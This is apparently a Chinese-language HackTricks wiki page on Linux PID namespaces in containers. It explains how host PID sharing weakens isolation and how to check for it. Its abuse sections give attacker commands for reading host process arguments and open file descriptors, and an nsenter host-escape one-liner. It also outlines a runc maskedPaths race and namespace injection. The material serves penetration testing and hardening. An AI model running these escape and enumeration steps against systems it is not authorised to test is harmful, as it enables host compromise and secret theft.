# PID 命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

PID 命名空间控制进程如何被编号以及哪些进程是可见的。这就是为什么容器可以拥有自己的 PID 1，尽管它并不是真正的机器。在该命名空间内部，工作负载看到的是看似本地的进程树。在命名空间外部，主机仍然看到真实的主机 PIDs 和完整的进程全景。

从安全角度来看，PID 命名空间很重要，因为进程可见性具有价值。一旦工作负载能够看到主机进程，它可能会观察到服务名称、命令行参数、通过进程参数传递的秘密、通过 `/proc` 获取的环境派生状态，以及潜在的命名空间进入目标。如果它能做的不仅仅是看到这些进程，例如在合适条件下发送信号或使用 ptrace，那么问题就会变得更加严重。

## 工作原理

一个新的 PID 命名空间以自己的内部进程编号开始。在其中创建的第一个进程从该命名空间的角度看成为 PID 1，这也意味着它对孤儿子进程和信号行为具有类似 init 的特殊语义。这解释了许多关于容器中 init 进程、僵尸进程回收以及为什么有时在容器中使用轻量级 init 包装器的怪异现象。

重要的安全教训是，一个进程可能看起来被隔离，因为它只看到自己的 PID 树，但这种隔离可以被刻意移除。Docker 通过 `--pid=host` 暴露这一点，而 Kubernetes 则通过 `hostPID: true` 实现。一旦容器加入主机 PID 命名空间，工作负载就能直接看到主机进程，许多后续攻击路径也会变得更为现实。

## 实验

手动创建 PID 命名空间：
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
shell 现在看到一个私有的进程视图。`--mount-proc` 标志很重要，因为它挂载了一个与新的 PID namespace 匹配的 procfs 实例，使得从内部看到的进程列表一致。

用于比较 container 的行为：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
The difference is immediate and easy to understand, which is why this is a good first lab for readers.

## 运行时用法

在 Docker、Podman、containerd 和 CRI-O 中，普通容器会获得它们自己的 PID namespace。Kubernetes Pods 通常也会有一个隔离的 PID 视图，除非工作负载明确请求 host PID sharing。LXC/Incus 环境依赖相同的内核原语，但 system-container 用例可能会暴露更复杂的进程树并鼓励更多调试捷径。

同样的规则适用于所有环境：如果运行时选择不隔离 PID namespace，那就是对容器边界的刻意缩减。

## 错误配置

最典型的错误配置是 host PID sharing。团队常以调试、监控或服务管理的便利为由为其辩护，但这始终应被视为一个重要的安全例外。即便容器默认无法对主机进程进行写入操作，单凭可见性也能暴露大量系统信息。一旦增加了诸如 `CAP_SYS_PTRACE` 或对 procfs 的有用访问权限，风险将大幅扩大。

另一个错误是假设由于工作负载默认无法 kill 或 ptrace 主机进程，因此 host PID sharing 无害。这样的结论忽视了枚举的价值、namespace-entry 目标的可用性，以及 PID 可见性与其他被削弱的控制措施如何相互结合。

## 滥用

如果共享了 host PID namespace，攻击者可能会检查主机进程、收集进程参数、识别有价值的服务、定位用于 `nsenter` 的候选 PID，或者将进程可见性与 ptrace 相关特权结合起来干扰主机或邻近的工作负载。在某些情况下，仅仅看到某个运行时间较长的进程就足以重塑后续的攻击计划。

第一步始终是确认主机进程是否确实可见：
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
一旦可以看到宿主机的 PIDs，进程参数和 namespace-entry 目标通常成为最有用的信息来源：
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
如果 `nsenter` 可用且权限足够，测试可见的主机进程是否可以用作命名空间桥：
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
即使入口被封锁，共享主机 PID 仍然有价值，因为它会暴露服务布局、运行时组件以及下一步可针对的特权进程候选。

主机 PID 的可见性也使得对文件描述符的滥用更为可行。如果某个特权主机进程或相邻工作负载打开了敏感文件或 socket，攻击者可能能够检查 `/proc/<pid>/fd/` 并根据所有权、procfs 挂载选项以及目标服务模型重用该句柄。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
这些命令有用，因为它们可以确定 `hidepid=1` 或 `hidepid=2` 是否降低了跨进程的可见性，以及诸如打开的机密文件、日志或 Unix 套接字等明显重要的描述符是否根本可见。

### 完整示例：主机 PID + `nsenter`

当进程还具有加入主机命名空间的足够权限时，主机 PID 共享会直接成为一次主机逃逸：
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
如果该命令成功，容器进程现在正在主机的挂载、UTS、网络、IPC 和 PID 命名空间中执行。其影响是立即导致主机被攻破。

即使 `nsenter` 本身缺失，如果主机文件系统被挂载，也可能通过主机上的二进制文件实现相同的结果：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近的运行时说明

一些 PID-namespace 相关的攻击并非传统的 `hostPID: true` 错误配置，而是与容器设置期间 procfs 保护如何应用有关的运行时实现漏洞。

#### `maskedPaths` 竞态到 host procfs

在存在漏洞的 `runc` 版本中，能够控制容器镜像或 `runc exec` 工作负载的攻击者可以通过将容器端的 `/dev/null` 替换为指向敏感 procfs 路径（例如 `/proc/sys/kernel/core_pattern`）的符号链接，从而在 masking 阶段发起竞态。如果竞态成功，masked-path 的 bind mount 可能会挂载到错误的目标，并将主机全局的 procfs 控制项暴露给新容器。

有用的检查命令：
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
这一点很重要，因为最终影响可能与直接对 procfs 的暴露相同：可写的 `core_pattern` 或 `sysrq-trigger`，随后可能导致 host code execution 或 denial of service。

#### 使用 `insject` 的命名空间注入

像 `insject` 这样的命名空间注入工具表明，PID-namespace 的交互并不总是要求在创建进程之前预先进入目标命名空间。辅助程序可以在稍后附加，使用 `setns()`，并在保留对目标 PID 空间可见性的情况下执行：
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
This kind of technique matters mainly for advanced debugging, offensive tooling, and post-exploitation workflows where namespace context must be joined after the runtime has already initialized the workload.

### Related FD Abuse Patterns

当可以看到主机 PID 时，有两种模式值得明确指出。首先，一个有特权的进程可能会在调用 `execve()` 时仍保持敏感的文件描述符打开，因为它没有被标记为 `O_CLOEXEC`。其次，服务可能通过 Unix 套接字使用 `SCM_RIGHTS` 传递文件描述符。在这两种情况下，有趣的对象不再是路径名，而是较低权限进程可能继承或接收的已打开句柄。

在容器工作中这很重要，因为该句柄可能指向 `docker.sock`、特权日志、主机上的秘密文件，或其他高价值对象，即使其路径本身在容器文件系统中不可直接访问。

## Checks

这些命令的目的是确定该进程是否具有私有的 PID 视图，或它是否已经能够枚举更广泛的进程视图。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
What is interesting here:

- 如果进程列表包含明显的主机服务，很可能已经启用了主机 PID 共享。
- 仅看到一个很小的容器本地进程树是正常基线；看到 `systemd`、`dockerd` 或不相关的守护进程则不是。
- 一旦主机 PID 可见，即使是只读的进程信息也会成为有用的侦察情报。

如果你发现容器以主机 PID 共享运行，不要把它当作表面差异。它显著改变了工作负载可以观察并可能影响的范围。
{{#include ../../../../../banners/hacktricks-training.md}}
